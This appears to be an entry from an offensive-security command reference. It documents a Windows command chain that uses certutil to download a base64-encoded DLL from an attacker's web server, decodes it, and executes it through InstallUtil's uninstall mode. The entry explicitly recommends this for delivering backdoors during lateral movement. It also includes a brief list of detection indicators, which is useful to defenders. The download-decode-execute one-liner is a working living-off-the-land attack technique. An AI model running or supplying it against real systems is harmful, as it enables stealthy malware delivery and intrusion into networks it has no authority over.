---
type: code
language: cmd
verified: true
platforms:
  - Windows
tags:
  - certutil
  - execution
  - payload
validated: true
---

# Certutil-Download-Decode-and-Execute-DLL-via-InstallUtil

## Code

```cmd
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

## Description

This command chain uses Certutil to download a base64-encoded DLL payload, decode it, and execute it via InstallUtil in uninstall mode for stealthy code execution without full service installation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| webserver | Attacker's web server hostname or IP | attacker.com |
| payload.b64 | Encoded payload filename on server | payload.b64 |
| payload.dll | Local decoded DLL filename | payload.dll |

## Usage

Execute in a Windows command prompt with outbound access. Host the base64-encoded DLL on your server first. Ideal for delivering backdoors during lateral movement; monitor for execution via network callbacks.

## Detection

- Sysmon logs for certutil.exe with -urlcache/-decode args.
- InstallUtil.exe spawns from unusual paths or with /u flag.
- Unexpected outbound HTTP to unknown domains.
- File creation events for .b64/.dll in temp dirs.

## Related

- [[procedures/Certutil-Download-and-Execute]]
- [[commands/installutil-execute-dll-payload]]
